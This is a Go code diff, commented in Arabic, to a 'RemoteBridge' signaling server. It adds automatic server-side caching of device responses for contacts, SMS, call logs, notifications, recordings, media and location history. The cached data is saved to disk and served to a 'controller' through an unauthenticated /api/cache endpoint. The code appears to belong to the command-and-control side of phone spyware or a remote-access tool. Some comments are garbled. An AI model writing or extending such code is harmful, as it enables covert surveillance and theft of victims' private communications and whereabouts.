@@ -104,6 +104,173 @@ func upsertStateSnapshot(s *StateSnapshot) {
 	stateMu.Unlock()
 }
 
+// ==========================================================
+// 🗄️ B12 — مخزن "البيانات المخزنة على الخادم" (كاش القوائم التلقائي)
+// كل رد مضيف لأوامر القوائم ضمن القائمة البيضاء يُحفظ في الذاكرة
+// ويُفرَّغ دورياً إلى ملف cache_store/cache.json لتجيّده بعد
+// إعادة نشر خادم render (الحاوية نفسها في مدة الدورّة تظل منفضة تماماً).
+// يعرض المتحكم هذه القوائم في نافذة "البيانات المخزنة على الخادم"
+// حتى وإن لم يُعاينها لحظتها أو انقطع المضيف عن الإنترنت.
+// ==========================================================
+type cacheEntry struct {
+	Ts   int64           `json:"ts"`
+	Data json.RawMessage `json:"data"`
+}
+
+var (
+	cacheMu    sync.RWMutex
+	cacheData  = make(map[string]map[string]*cacheEntry) // deviceID -> cmd -> entry
+	cacheDirty = false
+)
+
+const (
+	cacheCmdLimit   = 4 << 20 // 4MB لأقصى حجم لعنصر قائمة واحد
+	cacheTotalLimit = 48 << 20
+	cacheMaxDevices = 64
+)
+
+// أمر القوائم المخزّنة تلقائياً عند عبورها الخادم
+func isCachedCommand(cmd string) bool {
+	switch cmd {
+	case "contacts_list", "sms_list", "calls_list", "notifications_list",
+		"recordings_list", "media_items", "media_folders", "locations_get",
+		"locations_archive_list":
+		return true
+	}
+	return false
+}
+
+func cacheSnapshot(deviceID, cmd string, data json.RawMessage) {
+	if len(data) > cacheCmdLimit || len(data) < 2 {
+		return
+	}
+	cacheMu.Lock()
+	defer cacheMu.Unlock()
+	if _, exists := cacheData[deviceID]; !exists && len(cacheData) >= cacheMaxDevices {
+		return
+	}
+	if cacheData[deviceID] == nil {
+		cacheData[deviceID] = make(map[string]*cacheEntry)
+	}
+	cacheData[deviceID][cmd] = &cacheEntry{Ts: time.Now().UnixMilli(), Data: data}
+	cacheDirty = true
+}
+
+// 💾 تفريغ الكاش إلى القرص كل 5 دقائق إذا تحّر، وتحميله عند الإقلاع
+func cacheDiskPath() string { return filepath.Join("cache_store", "cache.json") }
+
+func periodicCacheDump() {
+	for {
+		time.Sleep(5 * time.Minute)
+		cacheMu.RLock()
+		dirty := cacheDirty
+		var out map[string]map[string]*cacheEntry
+		if dirty {
+			out = make(map[string]map[string]*cacheEntry)
+			for d, cmds := range cacheData {
+				cp := make(map[string]*cacheEntry)
+				for c, e := range cmds {
+					cp[c] = &cacheEntry{Ts: e.Ts, Data: json.RawMessage(append([]byte(nil), e.Data...))}
+				}
+				out[d] = cp
+			}
+		}
+		cacheMu.RUnlock()
+		if !dirty || out == nil {
+			continue
+		}
+		p := cacheDiskPath()
+		if dir := filepath.Dir(p); dir != "" {
+			_ = os.MkdirAll(dir, 0o755)
+		}
+		b, err := json.Marshal(out)
+		if err != nil {
+			continue
+		}
+		tmp := p + ".tmp"
+		if err := os.WriteFile(tmp, b, 0o644); err == nil {
+			_ = os.Rename(tmp, p)
+			cacheMu.Lock()
+			cacheDirty = false
+			cacheMu.Unlock()
+			log.Printf("تم تفريغ كاش القوائم إلى القرص: %d مضيف", len(out))
+		}
+	}
+}
+
+func loadCacheFromDisk() {
+	p := cacheDiskPath()
+	b, err := os.ReadFile(p)
+	if err != nil || len(b) < 2 {
+		return
+	}
+	var loaded map[string]map[string]*cacheEntry
+	if err := json.Unmarshal(b, &loaded); err != nil || loaded == nil {
+		return
+	}
+	cacheMu.Lock()
+	cacheData = loaded
+	cacheMu.Unlock()
+	log.Printf("تم تحميل كاش القوائم من القرص: %d مضيف", len(loaded))
+}
+
+func handleCacheAPI(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Access-Control-Allow-Origin", "*")
+	w.Header().Set("Access-Control-Allow-Methods", "GET, OPTIONS")
+	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
+	if r.Method == http.MethodOptions {
+		w.WriteHeader(http.StatusNoContent)
+		return
+	}
+	if r.Method != http.MethodGet {
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(http.StatusMethodNotAllowed)
+		json.NewEncoder(w).Encode(map[string]interface{}{"ok": false, "error": "روشت غير مدعوم"})
+		return
+	}
+	deviceID := r.URL.Query().Get("deviceId")
+	cmd := r.URL.Query().Get("cmd")
+	w.Header().Set("Content-Type", "application/json")
+	if deviceID == "" {
+		w.WriteHeader(http.StatusBadRequest)
+		json.NewEncoder(w).Encode(map[string]interface{}{"ok": false, "error": "مطلوب deviceId"})
+		return
+	}
+	cacheMu.RLock()
+	defer cacheMu.RUnlock()
+	cmds, ok := cacheData[deviceID]
+	if !ok || cmds == nil {
+		w.WriteHeader(http.StatusNotFound)
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"ok":    false,
+			"error": "لم تُحفظ قوائم لهذا المضيف بعد",
+		})
+		return
+	}
+	if cmd == "" {
+		w.WriteHeader(http.StatusOK)
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"deviceId": deviceID,
+			"cache":    cmds,
+			"ts":       time.Now().UnixMilli(),
+		})
+	} else {
+		e, found := cmds[cmd]
+		if !found || e == nil {
+			w.WriteHeader(http.StatusNotFound)
+			json.NewEncoder(w).Encode(map[string]interface{}{"ok": false, "error": "لا كاش لهذا الأمر"})
+			return
+		}
+		w.WriteHeader(http.StatusOK)
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"deviceId": deviceID,
+			"cmd":      cmd,
+			"ts":       e.Ts,
+			"data":     e.Data,
+		})
+	}
+}
+
 // Prometheus metrics
 var (
 	wsConnections = promauto.NewGauge(prometheus.GaugeOpts{
@@ -198,9 +365,15 @@ func main() {
 
 	http.HandleFunc("/ws", handleWebSocket)
 	http.HandleFunc("/api/state", handleStateAPI)
+	// B12 — البيانات المخزنة على الخادم: آخر ردود قوائم المضيف تُحفظ تلقائياً وتُقدَّم للمتحكم
+	http.HandleFunc("/api/cache", handleCacheAPI)
 	http.HandleFunc("/api/blob", handleBlobAPI)
 	// B6: مسار القائمة التي تعتمد عليها لوحة الخزنة ونافذة الحالة في لوحة التحكم (كان يُرجع 404 صامتاً)
 	http.HandleFunc("/api/blob/list", handleBlobListAPI)
+
+	// B12 — البيانات المخزنة على الخادم: كاش القوائم التلقائي (تحميل من القرص + تفريغ دوري)
+	loadCacheFromDisk()
+	go periodicCacheDump()
 
 	addr := "0.0.0.0:" + port
 	log.Printf("RemoteBridge Signaling Server starting on %s", addr)
@@ -408,6 +581,20 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request) {
 			}
 
 		case "rpc_response":
+			// 🗄️ B12 — أرشفة تلقائية: آخر رد لكل أمر من قائمة القائمة البيضاء
+			// يُخزم في كاش الخادم ليواجه المتحكم لطفاً "البيانات المخزنة على الخادم"
+			var respProbe struct {
+				From string          `json:"from"`
+				Data json.RawMessage `json:"data"`
+			}
+			if json.Unmarshal(msgBytes, &respProbe) == nil && len(respProbe.Data) > 2 {
+				var cmdProbe struct {
+					Cmd string `json:"cmd"`
+				}
+				if json.Unmarshal(respProbe.Data, &cmdProbe) == nil && cmdProbe.Cmd != "" && isCachedCommand(cmdProbe.Cmd) && respProbe.From != "" {
+					cacheSnapshot(respProbe.From, cmdProbe.Cmd, respProbe.Data)
+				}
+			}
 			if relayMessage(msgBytes, meta.To) {
 				messagesRelayed.WithLabelValues("rpc_response", "success").Inc()
 			} else {
